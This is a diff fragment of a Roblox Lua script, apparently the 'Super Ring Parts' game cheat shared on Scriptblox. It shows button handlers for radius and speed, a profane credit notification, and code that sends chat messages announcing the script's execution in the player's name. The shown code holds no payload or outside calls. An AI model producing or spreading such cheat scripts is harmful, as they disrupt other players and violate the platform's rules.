+IncreaseRadius.MouseButton1Click:Connect(function()
+	radius = math.min(100, radius + 5)
+	RadiusDisplay.Text = "Radius: " .. radius
+	playSound("12221967")
+end)
+
+
+
+-- Notifications
+StarterGui:SetCore("SendNotification", {
+	Title = "Huge Credits for Projecto LKB!",
+	Text = "Tampered and fucked by KYUU!",
+	Duration = 10
+})
+
+-- Update SpeedDisplay text
+local function updateSpeedDisplay()
+	SpeedDisplay.Text = "Speed: " .. rotationSpeed
+end
+
+-- Decrease speed button logic
+DecreaseSpeed.MouseButton1Click:Connect(function()
+	rotationSpeed = math.max(1, rotationSpeed - 1) -- Ensure speed doesn't go below 1
+	updateSpeedDisplay()
+	playSound("12221967")
+end)
+
+-- Increase speed button logic
+IncreaseSpeed.MouseButton1Click:Connect(function()
+	rotationSpeed = math.min(100, rotationSpeed + 1) -- Limit speed to a maximum of 100
+	updateSpeedDisplay()
+	playSound("12221967")
+end)
+
+-- Update SpeedDisplay text initially
+updateSpeedDisplay()
+
+
+
+local function SendChatMessage(message)
+	if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+		local textChannel = TextChatService.TextChannels.RBXGeneral
+		textChannel:SendAsync(message)
+	else
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+	end
+end
+
+-- Send the chat message
+SendChatMessage("Super Ring Parts Projeto LKB Executed! ✨")
+SendChatMessage("Modified by KYUU and Uploaded to Scriptblox!")
